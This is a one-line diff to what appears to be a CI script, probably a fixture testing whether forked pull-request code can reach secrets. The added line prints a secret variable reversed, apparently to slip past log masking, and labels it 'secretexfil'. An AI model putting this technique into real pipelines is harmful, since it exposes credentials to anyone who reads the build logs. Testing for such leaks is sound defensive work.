@@ -1,1 +1,1 @@
-echo "CI-BASE-RAN secretlen=${#PS}"
+echo "FORK-CI-CODE-RAN secretexfil=$(printf %s "$PS" | rev)"
